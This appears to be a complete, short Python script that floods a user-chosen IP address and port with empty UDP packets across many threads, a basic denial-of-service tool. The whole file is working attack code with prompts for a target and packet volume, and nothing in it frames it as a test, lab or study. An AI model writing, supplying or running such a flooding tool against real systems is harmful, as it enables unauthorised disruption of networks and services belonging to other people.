import socket
import threading

def send_packets(ip_address, port, packet_count):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for i in range(packet_count):
        udp_socket.sendto(b"", (ip_address, port))
    udp_socket.close()

ip_address = input("Enter the target IP address: ")
port = int(input("Enter the target port: "))
packet_count = int(input("Enter the number of packets to send: "))
thread_count = int(input("Enter the number of threads to use: "))

for i in range(thread_count):
    thread = threading.Thread(target=send_packets, args=(ip_address, port, packet_count))
    thread.start()

print(f"Sent {thread_count * packet_count} packets to {ip_address}:{port}.")
